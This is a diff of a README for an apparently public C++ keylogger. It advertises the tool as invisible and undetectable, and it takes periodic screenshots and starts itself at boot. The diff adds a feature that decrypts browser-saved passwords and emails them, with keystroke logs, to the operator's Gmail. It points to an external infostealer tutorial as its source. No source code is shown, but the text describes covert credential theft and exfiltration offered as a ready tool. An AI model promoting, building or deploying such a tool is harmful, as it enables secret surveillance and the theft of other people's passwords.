@@ -10,7 +10,10 @@ Keylogger is 100% invisible keylogger not only for users, but also undetectable 
 
 - Continuous Screenshots: will Capture desktop screen-shots after a given 7 seconds (u are free to change time intetval accoring to requirements).
 
-- Email Sending: Screenshot and keylogger Logfile which contain senstive user information send to registered email (Gmail only) (Mobile/Web/System). Script to send email is also written in C++. 
+- Decrypt passwords stored by user in browser and store decrypted passwords in dat file (Newly added feature. Special thanks to EVIL-ACID for awesome tutorial on this. 
+  for more info, visit https://github.com/EVIL-ACID/Malware-Development/tree/main/Malware101:Infostealers)
+
+- Email Sending: Screenshot, browser passwords file and keylogger Logfile which contain senstive user information send to registered email (Gmail only) (Mobile/Web/System). Script to send email is also written in C++. 
 
 - AutoStart : Keylogger has functionaility to auto execute on system bootup. It Insert entry on system startup program when it is running.
 
@@ -18,6 +21,7 @@ Keylogger is 100% invisible keylogger not only for users, but also undetectable 
 
 #### Required Lib:
 - CURL
+- sqlite (sqlite3.dll)
 
 #### Notes:
 - Current version only supports Gmail. So u have to provide your Gmail's Email ID and APP password. You have to generate APP password from GMAIL account's security settings after enabling 2-step-verification on your gmail account. Now a days Gmail has incresed security and due to that, to receive email from 3rd party un-autheticated apps, users has to generate app password and use that to autheticate 3rd party apps. 
